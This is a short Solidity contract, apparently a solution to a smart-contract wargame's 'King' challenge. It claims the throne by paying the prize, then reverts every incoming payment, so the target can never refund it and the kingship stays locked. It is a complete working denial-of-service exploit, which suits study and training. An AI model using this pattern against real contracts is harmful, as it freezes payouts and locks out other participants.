// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract KingAttacker {
    King public immutable i_king;

    error KingAttacker__InvalidPrize();
    error KingAttacker__EthTransferFailed();
    error KingAttacker_LockedForever();

    constructor(address payable _king) {
        i_king = King(_king);
    }

    function changeKing() external payable {
        uint256 prize = i_king.prize();

        if (msg.value < prize) {
            revert KingAttacker__InvalidPrize();
        }

        (bool success,) = address(i_king).call{value: msg.value}("");
        if (!success) {
            revert KingAttacker__EthTransferFailed();
        }
    }

    receive() external payable {
        revert KingAttacker_LockedForever();
    }
}
